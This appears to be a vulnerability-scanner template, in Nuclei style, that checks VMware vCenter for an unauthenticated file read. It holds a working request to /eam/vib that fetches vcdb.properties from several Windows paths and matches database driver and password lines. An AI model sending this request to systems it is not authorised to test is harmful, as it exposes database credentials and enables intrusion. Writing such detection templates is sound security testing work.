id: vmware-vcenter-lfi
info:
  author: dwisiswant0
  name: VMware vCenter Unauthenticated Arbitrary File Read
  reference:
  - https://kb.vmware.com/s/article/7960893
  - https://twitter.com/ptswarm/status/1316016337550938122
  severity: high
  tags: vmware,lfi,vcenter
requests:
- matchers:
  - regex:
    - (?m)^(driver|dbtype|password(\.encrypted)?)\s=
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - C:\ProgramData\VMware\VMware+VirtualCenter
    - C:\Documents+and+Settings\All+Users\Application+Data\VMware\VMware+VirtualCenter
    - C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx
  raw:
  - 'GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1

    Host: {{Hostname}}

    '
